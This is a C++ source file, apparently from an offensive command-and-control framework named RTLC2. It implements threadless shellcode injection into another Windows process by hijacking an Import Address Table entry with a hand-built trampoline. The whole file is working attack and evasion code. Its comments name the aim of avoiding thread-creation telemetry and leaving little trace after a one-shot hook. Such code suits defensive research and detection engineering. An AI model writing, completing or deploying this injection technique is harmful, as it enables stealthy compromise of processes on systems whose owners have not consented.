/*
 * threadless_inject.cpp - IAT-based Threadless Injection
 *
 * Performs code execution in a remote process without creating a new thread.
 * Instead, we overwrite an Import Address Table (IAT) entry in the target
 * process so that when it naturally calls the hooked function, our trampoline
 * executes the shellcode first, then jumps to the original function.
 *
 * Advantages over CreateRemoteThread-based injection:
 *   - No new thread creation (avoids ETW thread-creation events)
 *   - No APC queuing
 *   - Execution happens in the context of an existing thread
 *   - The hook is one-shot: after first execution, IAT is restored
 *
 * Flow:
 *   1. Open target process
 *   2. Find target DLL's IAT entry for the specified function
 *   3. Allocate memory in remote process for trampoline + shellcode
 *   4. Build trampoline: save regs -> call shellcode -> restore regs ->
 *      restore IAT -> jmp original function
 *   5. Overwrite IAT entry to point to our trampoline
 *   6. Wait for natural execution
 *
 * Part of RTLC2 Phase 4: Advanced Evasion Techniques
 */

#include "evasion.h"

#ifdef RTLC2_WINDOWS
#include <windows.h>
#include <tlhelp32.h>
#include <cstdint>
#include <cstring>

namespace rtlc2 {
namespace evasion {
namespace injection {

// ============================================================================
// Internal Helpers
// ============================================================================

// Find the base address of a module loaded in a remote process
static HMODULE FindRemoteModuleBase(HANDLE hProcess, uint32_t pid, const char* moduleName) {
    (void)hProcess; // We use snapshot-based enumeration
    HMODULE result = nullptr;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return nullptr;

    MODULEENTRY32 me = {};
    me.dwSize = sizeof(MODULEENTRY32);

    if (Module32First(hSnapshot, &me)) {
        do {
            // Case-insensitive comparison of module name
            if (_stricmp(me.szModule, moduleName) == 0) {
                result = me.hModule;
                break;
            }
        } while (Module32Next(hSnapshot, &me));
    }

    CloseHandle(hSnapshot);
    return result;
}

// Read a block of memory from a remote process. Returns true on success.
static bool ReadRemote(HANDLE hProcess, const void* remoteAddr, void* localBuf, size_t size) {
    SIZE_T bytesRead = 0;
    BOOL ok = ReadProcessMemory(hProcess, remoteAddr, localBuf, size, &bytesRead);
    return ok && (bytesRead == size);
}

// Write a block of memory to a remote process. Returns true on success.
static bool WriteRemote(HANDLE hProcess, void* remoteAddr, const void* localBuf, size_t size) {
    SIZE_T bytesWritten = 0;
    BOOL ok = WriteProcessMemory(hProcess, remoteAddr, localBuf, size, &bytesWritten);
    return ok && (bytesWritten == size);
}

// Walk the PE import directory of a remotely-loaded DLL to find the IAT
// entry for a specific imported function.
//
// Returns the remote address of the IAT slot, and stores the original
// function pointer (what the IAT slot currently points to) in *pOrigFunc.
static void* FindRemoteIATEntry(HANDLE hProcess, HMODULE remoteBase,
                                 const char* targetFunc, void** pOrigFunc) {
    // Read the DOS header
    IMAGE_DOS_HEADER dosHeader = {};
    if (!ReadRemote(hProcess, remoteBase, &dosHeader, sizeof(dosHeader))) return nullptr;
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    // Read the NT headers
    auto* ntHeaderAddr = (uint8_t*)remoteBase + dosHeader.e_lfanew;
    IMAGE_NT_HEADERS ntHeaders = {};
    if (!ReadRemote(hProcess, ntHeaderAddr, &ntHeaders, sizeof(ntHeaders))) return nullptr;
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) return nullptr;

    // Get the import directory
    auto& importDir = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress == 0 || importDir.Size == 0) return nullptr;

    auto* importDescAddr = (uint8_t*)remoteBase + importDir.VirtualAddress;

    // Iterate through import descriptors
    for (DWORD offset = 0; offset < importDir.Size; offset += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        IMAGE_IMPORT_DESCRIPTOR importDesc = {};
        if (!ReadRemote(hProcess, importDescAddr + offset, &importDesc, sizeof(importDesc)))
            break;

        // Null terminator
        if (importDesc.Name == 0 && importDesc.FirstThunk == 0) break;

        // We need to walk the OriginalFirstThunk (Import Name Table) in
        // parallel with FirstThunk (Import Address Table) to match names
        // to addresses.
        if (importDesc.OriginalFirstThunk == 0) continue;

        auto* intAddr = (uint8_t*)remoteBase + importDesc.OriginalFirstThunk;
        auto* iatAddr = (uint8_t*)remoteBase + importDesc.FirstThunk;

        for (DWORD idx = 0; ; idx++) {
            // Read the INT entry (IMAGE_THUNK_DATA)
            IMAGE_THUNK_DATA thunk = {};
            size_t thunkSize = sizeof(IMAGE_THUNK_DATA);
            if (!ReadRemote(hProcess, intAddr + idx * thunkSize, &thunk, thunkSize))
                break;

            // Null terminator
            if (thunk.u1.AddressOfData == 0) break;

            // Skip ordinal imports (high bit set)
#ifdef _WIN64
            if (thunk.u1.Ordinal & IMAGE_ORDINAL_FLAG64) continue;
#else
            if (thunk.u1.Ordinal & IMAGE_ORDINAL_FLAG32) continue;
#endif

            // Read the import name (IMAGE_IMPORT_BY_NAME)
            auto* nameAddr = (uint8_t*)remoteBase + (DWORD)(thunk.u1.AddressOfData);
            IMAGE_IMPORT_BY_NAME importName = {};
            if (!ReadRemote(hProcess, nameAddr, &importName, sizeof(importName)))
                continue;

            // Read the full function name (importName.Name is the first char)
            char funcName[256] = {};
            if (!ReadRemote(hProcess, &((IMAGE_IMPORT_BY_NAME*)nameAddr)->Name, funcName, sizeof(funcName) - 1))
                continue;
            funcName[255] = '\0';

            if (_stricmp(funcName, targetFunc) == 0) {
                // Found it! Read the current IAT value (original function pointer)
                void* iatSlotAddr = iatAddr + idx * thunkSize;
                void* origFunc = nullptr;
                if (!ReadRemote(hProcess, iatSlotAddr, &origFunc, sizeof(origFunc)))
                    return nullptr;

                if (pOrigFunc) *pOrigFunc = origFunc;
                return iatSlotAddr;
            }
        }
    }

    return nullptr; // Function not found in imports
}

// ============================================================================
// x64 Trampoline Shellcode Builder
// ============================================================================

#ifdef _WIN64

// Build a trampoline that:
//   1. Saves all volatile registers
//   2. Calls the shellcode
//   3. Restores all volatile registers
//   4. Restores the original IAT entry (one-shot self-cleanup)
//   5. Jumps to the original function
//
// Layout in remote memory:
//   [trampoline code] [shellcode] [original_func_addr] [iat_slot_addr]
//
// Returns the total size of the trampoline + shellcode blob.
static size_t BuildTrampoline(uint8_t* buf, size_t bufSize,
                               size_t shellcodeSize,
                               void* origFunc, void* iatSlotAddr) {
    // Trampoline stub (x64):
    //   push rbx
    //   push rcx
    //   push rdx
    //   push rsi
    //   push rdi
    //   push rbp
    //   push r8 - r15
    //   pushfq
    //   sub rsp, 0x20          ; shadow space
    //   lea rax, [rip + shellcode_offset]  ; point to shellcode
    //   call rax                ; execute shellcode
    //   add rsp, 0x20          ; remove shadow space
    //   ; --- Restore IAT entry (one-shot) ---
    //   mov rax, [rip + orig_func_offset]  ; original function addr
    //   mov rcx, [rip + iat_slot_offset]   ; IAT slot addr
    //   mov [rcx], rax                      ; restore IAT
    //   popfq
    //   pop r15 - r8
    //   pop rbp
    //   pop rdi
    //   pop rsi
    //   pop rdx
    //   pop rcx
    //   pop rbx
    //   jmp [rip + orig_func_offset_2]     ; jump to original

    size_t off = 0;

    // Helper to write bytes
    auto emit = [&](const void* data, size_t len) {
        if (off + len <= bufSize) {
            memcpy(buf + off, data, len);
        }
        off += len;
    };
    auto emit8 = [&](uint8_t b) { emit(&b, 1); };
    auto emit32 = [&](uint32_t v) { emit(&v, 4); };
    auto emit64 = [&](uint64_t v) { emit(&v, 8); };

    // Save registers
    emit8(0x53);                               // push rbx
    emit8(0x51);                               // push rcx
    emit8(0x52);                               // push rdx
    emit8(0x56);                               // push rsi
    emit8(0x57);                               // push rdi
    emit8(0x55);                               // push rbp
    emit8(0x41); emit8(0x50);                  // push r8
    emit8(0x41); emit8(0x51);                  // push r9
    emit8(0x41); emit8(0x52);                  // push r10
    emit8(0x41); emit8(0x53);                  // push r11
    emit8(0x41); emit8(0x54);                  // push r12
    emit8(0x41); emit8(0x55);                  // push r13
    emit8(0x41); emit8(0x56);                  // push r14
    emit8(0x41); emit8(0x57);                  // push r15
    emit8(0x9C);                               // pushfq

    // sub rsp, 0x28 (shadow space + alignment)
    emit8(0x48); emit8(0x83); emit8(0xEC); emit8(0x28);

    // We need to compute the offset to the shellcode from current RIP.
    // The shellcode will be placed right after the trampoline code.
    // We'll fix this offset up after we know the trampoline size.
    size_t leaRaxPatchOffset = off;

    // lea rax, [rip + XX]  (7 bytes: 48 8D 05 XX XX XX XX)
    emit8(0x48); emit8(0x8D); emit8(0x05); emit32(0); // placeholder

    // call rax (2 bytes: FF D0)
    emit8(0xFF); emit8(0xD0);

    // add rsp, 0x28
    emit8(0x48); emit8(0x83); emit8(0xC4); emit8(0x28);

    // --- IAT Restore (one-shot) ---
    // mov rax, [rip + orig_func_data_offset]
    size_t movRaxPatchOffset = off;
    emit8(0x48); emit8(0x8B); emit8(0x05); emit32(0); // placeholder

    // mov rcx, [rip + iat_slot_data_offset]
    size_t movRcxPatchOffset = off;
    emit8(0x48); emit8(0x8B); emit8(0x0D); emit32(0); // placeholder

    // mov [rcx], rax  (3 bytes: 48 89 01)
    emit8(0x48); emit8(0x89); emit8(0x01);

    // Restore registers
    emit8(0x9D);                               // popfq
    emit8(0x41); emit8(0x5F);                  // pop r15
    emit8(0x41); emit8(0x5E);                  // pop r14
    emit8(0x41); emit8(0x5D);                  // pop r13
    emit8(0x41); emit8(0x5C);                  // pop r12
    emit8(0x41); emit8(0x5B);                  // pop r11
    emit8(0x41); emit8(0x5A);                  // pop r10
    emit8(0x41); emit8(0x59);                  // pop r9
    emit8(0x41); emit8(0x58);                  // pop r8
    emit8(0x5D);                               // pop rbp
    emit8(0x5F);                               // pop rdi
    emit8(0x5E);                               // pop rsi
    emit8(0x5A);                               // pop rdx
    emit8(0x59);                               // pop rcx
    emit8(0x5B);                               // pop rbx

    // jmp [rip + orig_func_jmp_offset]  (6 bytes: FF 25 XX XX XX XX)
    size_t jmpPatchOffset = off;
    emit8(0xFF); emit8(0x25); emit32(0);       // placeholder

    // Align to 8 bytes for data
    while (off % 8 != 0) emit8(0x90);         // NOP padding

    // Data section: original function address
    size_t origFuncDataOffset = off;
    emit64((uint64_t)origFunc);

    // Data section: IAT slot address
    size_t iatSlotDataOffset = off;
    emit64((uint64_t)iatSlotAddr);

    // Now the shellcode goes right here
    size_t shellcodeOffset = off;

    // --- Patch up RIP-relative offsets ---
    // lea rax, [rip + shellcode_offset]: RIP after lea = leaRaxPatchOffset + 7
    if (leaRaxPatchOffset + 7 <= bufSize) {
        int32_t rel = (int32_t)(shellcodeOffset - (leaRaxPatchOffset + 7));
        memcpy(buf + leaRaxPatchOffset + 3, &rel, 4);
    }

    // mov rax, [rip + orig_func_data]: RIP after mov = movRaxPatchOffset + 7
    if (movRaxPatchOffset + 7 <= bufSize) {
        int32_t rel = (int32_t)(origFuncDataOffset - (movRaxPatchOffset + 7));
        memcpy(buf + movRaxPatchOffset + 3, &rel, 4);
    }

    // mov rcx, [rip + iat_slot_data]: RIP after mov = movRcxPatchOffset + 7
    if (movRcxPatchOffset + 7 <= bufSize) {
        int32_t rel = (int32_t)(iatSlotDataOffset - (movRcxPatchOffset + 7));
        memcpy(buf + movRcxPatchOffset + 3, &rel, 4);
    }

    // jmp [rip + orig_func_data]: RIP after jmp = jmpPatchOffset + 6
    if (jmpPatchOffset + 6 <= bufSize) {
        int32_t rel = (int32_t)(origFuncDataOffset - (jmpPatchOffset + 6));
        memcpy(buf + jmpPatchOffset + 2, &rel, 4);
    }

    return off; // Total trampoline size (shellcode goes at 'shellcodeOffset')
}

#else // x86

// 32-bit trampoline: simpler, uses pushad/popad
static size_t BuildTrampoline(uint8_t* buf, size_t bufSize,
                               size_t shellcodeSize,
                               void* origFunc, void* iatSlotAddr) {
    size_t off = 0;
    auto emit8 = [&](uint8_t b) { if (off < bufSize) buf[off] = b; off++; };
    auto emit32 = [&](uint32_t v) {
        if (off + 4 <= bufSize) memcpy(buf + off, &v, 4);
        off += 4;
    };

    // pushad
    emit8(0x60);
    // pushfd
    emit8(0x9C);

    // call shellcode (will be patched)
    size_t callPatchOffset = off;
    emit8(0xE8); emit32(0); // placeholder for rel32

    // popfd
    emit8(0x9D);
    // popad
    emit8(0x61);

    // Restore IAT: mov dword [iatSlotAddr], origFunc
    emit8(0xC7); emit8(0x05);
    emit32((uint32_t)(uintptr_t)iatSlotAddr);
    emit32((uint32_t)(uintptr_t)origFunc);

    // jmp origFunc
    emit8(0xE9);
    size_t jmpPatchOffset = off;
    emit32(0); // placeholder

    size_t shellcodeOffset = off;

    // Patch call offset: target = shellcodeOffset, source = callPatchOffset + 5
    if (callPatchOffset + 5 <= bufSize) {
        int32_t rel = (int32_t)(shellcodeOffset - (callPatchOffset + 5));
        memcpy(buf + callPatchOffset + 1, &rel, 4);
    }

    // Patch jmp offset: target = origFunc, but this is an absolute address,
    // and we need it relative to remote allocation. We'll fix this up after
    // we know the remote base address. For now, store 0 as placeholder.
    // Actually, jmp to origFunc directly:
    // The remote address of this instruction is unknown at build time,
    // so we use push/ret instead:
    // Rewind and replace jmp with push+ret
    off = jmpPatchOffset - 1; // back to the E9 byte
    emit8(0x68);              // push imm32
    emit32((uint32_t)(uintptr_t)origFunc);
    emit8(0xC3);              // ret

    shellcodeOffset = off;

    // Repatch call offset with new shellcodeOffset
    if (callPatchOffset + 5 <= bufSize) {
        int32_t rel = (int32_t)(shellcodeOffset - (callPatchOffset + 5));
        memcpy(buf + callPatchOffset + 1, &rel, 4);
    }

    return off;
}

#endif // _WIN64

// ============================================================================
// Public API
// ============================================================================

// Perform threadless injection into a remote process by hijacking an IAT entry.
//
// Parameters:
//   pid         - Target process ID
//   shellcode   - Shellcode payload to execute
//   size        - Size of shellcode in bytes
//   targetDll   - Name of the DLL in the target process whose IAT to hijack
//                 (e.g., "kernel32.dll", "ntdll.dll", "user32.dll")
//   targetFunc  - Name of the imported function to hijack
//                 (e.g., "Sleep", "WaitForSingleObject", "GetTickCount")
//                 Choose a function that the target process calls frequently.
//
// Returns true if the injection was set up successfully. Note that the
// shellcode will not execute until the target process calls targetFunc.
bool ThreadlessInject(uint32_t pid, const uint8_t* shellcode, size_t size,
                      const char* targetDll, const char* targetFunc) {
    if (!shellcode || size == 0 || !targetDll || !targetFunc) return false;

    // Step 1: Open the target process with necessary permissions
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) return false;

    bool success = false;

    do {
        // Step 2: Find the target DLL's base address in the remote process
        HMODULE remoteBase = FindRemoteModuleBase(hProcess, pid, targetDll);
        if (!remoteBase) break;

        // Step 3: Locate the IAT entry for the target function
        void* origFunc = nullptr;
        void* iatSlotAddr = FindRemoteIATEntry(hProcess, remoteBase, targetFunc, &origFunc);
        if (!iatSlotAddr || !origFunc) break;

        // Step 4: Build the trampoline stub
        // First pass: calculate size
        size_t trampolineSize = BuildTrampoline(nullptr, 0, size, origFunc, iatSlotAddr);
        size_t totalSize = trampolineSize + size;

        // Allocate a local buffer to build the payload
        uint8_t* payload = (uint8_t*)VirtualAlloc(nullptr, totalSize,
                                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!payload) break;

        // Second pass: actually build the trampoline
        memset(payload, 0xCC, totalSize); // Fill with INT3 for safety
        size_t actualTrampolineSize = BuildTrampoline(payload, totalSize, size, origFunc, iatSlotAddr);

        // Append shellcode after the trampoline
        memcpy(payload + actualTrampolineSize, shellcode, size);

        // Step 5: Allocate RW memory in the remote process
        void* remotePayload = VirtualAllocEx(hProcess, nullptr, totalSize,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remotePayload) {
            VirtualFree(payload, 0, MEM_RELEASE);
            break;
        }

        // Step 6: Write the trampoline + shellcode to remote memory
        if (!WriteRemote(hProcess, remotePayload, payload, totalSize)) {
            VirtualFreeEx(hProcess, remotePayload, 0, MEM_RELEASE);
            VirtualFree(payload, 0, MEM_RELEASE);
            break;
        }

        VirtualFree(payload, 0, MEM_RELEASE);

        // Step 7: Change remote memory protection to RX (execute, no write)
        DWORD oldProtect = 0;
        if (!VirtualProtectEx(hProcess, remotePayload, totalSize,
                               PAGE_EXECUTE_READ, &oldProtect)) {
            VirtualFreeEx(hProcess, remotePayload, 0, MEM_RELEASE);
            break;
        }

        // Step 8: Overwrite the IAT entry to point to our trampoline
        // The IAT slot currently contains origFunc; we replace it with
        // the address of our trampoline in the remote process.
        void* trampolineAddr = remotePayload;
        if (!WriteRemote(hProcess, iatSlotAddr, &trampolineAddr, sizeof(trampolineAddr))) {
            VirtualFreeEx(hProcess, remotePayload, 0, MEM_RELEASE);
            break;
        }

        // Step 9: Flush instruction cache to ensure coherency
        FlushInstructionCache(hProcess, remotePayload, totalSize);

        success = true;

        // The IAT is now hijacked. When the target process calls
        // targetFunc, execution will flow:
        //   IAT -> our trampoline -> shellcode -> restore IAT -> original function
        //
        // After the first call, the IAT is restored (one-shot), so
        // subsequent calls go directly to the original function.

    } while (false);

    CloseHandle(hProcess);
    return success;
}

} // namespace injection
} // namespace evasion
} // namespace rtlc2

#else // POSIX stub

namespace rtlc2 {
namespace evasion {
namespace injection {

bool ThreadlessInject(uint32_t, const uint8_t*, size_t, const char*, const char*) {
    return false;
}

} // namespace injection
} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
